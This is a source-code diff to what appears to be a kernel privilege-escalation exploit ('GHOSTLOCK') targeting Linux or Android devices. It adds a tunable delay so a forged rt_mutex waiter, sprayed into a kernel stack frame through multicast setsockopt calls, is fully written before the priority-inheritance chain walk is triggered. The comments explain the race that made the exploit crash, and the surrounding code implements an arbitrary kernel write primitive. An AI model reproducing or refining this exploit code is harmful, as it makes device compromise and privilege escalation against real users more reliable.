@@ -1,6 +1,7 @@
 #include "routes/multicast_waiter_route.h"
 
 #include <netinet/in.h>
+#include <stdlib.h>
 #include <time.h>
 #include <unistd.h>
 
@@ -30,6 +31,32 @@ static double fops_elapsed_ms(struct timespec *ref) {
 
 static const struct execution_settings *resident_execution_settings(void) {
     return target_profile_execution(&g_exploit_session.profile);
+}
+
+/* Settle between the respraying setsockopt and the scheduling change that
+ * walks the PI chain.
+ *
+ * The forged waiter is written into the reclaiming syscall's kernel stack
+ * frame. Reclaiming and walking it are two different threads, so a walk that
+ * starts while the copy is still in flight observes a half-written object and
+ * faults inside rt_mutex_adjust_prio_chain() (observed as waiter->lock == 0,
+ * i.e. all zeroes at the first field the walk reads after a valid
+ * waiter->task). Give the copy a bounded moment to land before triggering the
+ * walk. Overridable at runtime for device tuning; the app passes
+ * GHOSTLOCK_MCAST_SETTLE_US through to the native binary. */
+static useconds_t multicast_post_spray_settle_us(void) {
+    static useconds_t cached = 0;
+    if (!cached) {
+        useconds_t v = 500;
+        const char *env = getenv("GHOSTLOCK_MCAST_SETTLE_US");
+        if (env && *env) {
+            const unsigned long parsed = strtoul(env, nullptr, 0);
+            if (parsed > 0 && parsed <= 200000UL)
+                v = static_cast<useconds_t>(parsed);
+        }
+        cached = v ? v : 1;
+    }
+    return cached;
 }
 
 static void multicast_waiter_interrupt(int sig) {
@@ -205,6 +232,9 @@ int MulticastWaiterRoute::start() noexcept {
     while (!atomic_load(&context->waiter_ready) &&
             fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
         sched_yield();
+    /* Let the kernel-side copy of the stamped buffer land before the
+     * scheduling change walks the chain (see multicast_post_spray_settle_us). */
+    usleep(multicast_post_spray_settle_us());
     if (!atomic_load(&context->waiter_ready) ||
             multicast_waiter_adjust(context) < 0)
         return 0;
@@ -224,6 +254,10 @@ int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
     atomic_store(&context->sprayed, 0);
     atomic_store(&context->respray_requested, 1);
     while (!atomic_load(&context->sprayed)) sched_yield();
+    /* The worker signals `sprayed` from userspace, right after setsockopt()
+     * returned; the kernel-side copy into the reclaiming stack frame is what
+     * the walk consumes as the forged waiter. Settle before triggering it. */
+    usleep(multicast_post_spray_settle_us());
     long r = multicast_waiter_adjust(context);
     pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n", value, target, r);
     return r == 0;
